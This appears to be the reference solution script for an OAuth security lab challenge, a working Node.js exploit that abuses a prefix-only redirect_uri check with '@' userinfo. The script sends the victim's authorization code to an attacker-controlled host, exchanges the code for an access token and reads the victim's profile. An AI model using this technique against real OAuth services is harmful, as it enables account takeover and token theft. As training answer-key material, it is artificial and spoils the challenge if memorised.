// Reference solution for challenge 2. Spoilers. Run: node solutions/redirect-prefix.mjs [baseUrl] [attackerUrl]
export async function solve(base = 'http://localhost:4102', attacker = 'http://127.0.0.1:4103') {
  const host = new URL(base).host;
  // Passes "starts with http://localhost:4102", but the real host is whatever follows the @.
  const redirectUri = `${base}@${new URL(attacker).host}/steal`;
  const link = `${base}/authorize?client_id=notes-spa&response_type=code&redirect_uri=${encodeURIComponent(redirectUri)}&state=x`;
  await fetch(base + '/victim/visit', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ url: link }) });
  const { captured } = await fetch(attacker + '/log').then((r) => r.json());
  const code = captured.at(-1)?.query?.code;
  if (!code) return { error: 'no code captured', captured, host };
  const { access_token } = await fetch(base + '/token', { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ client_id: 'notes-spa', code }) }).then((r) => r.json());
  return fetch(base + '/api/me', { headers: { authorization: `Bearer ${access_token}` } }).then((r) => r.json());
}
if (import.meta.url === `file://${process.argv[1]}`) console.log(await solve(process.argv[2], process.argv[3]));
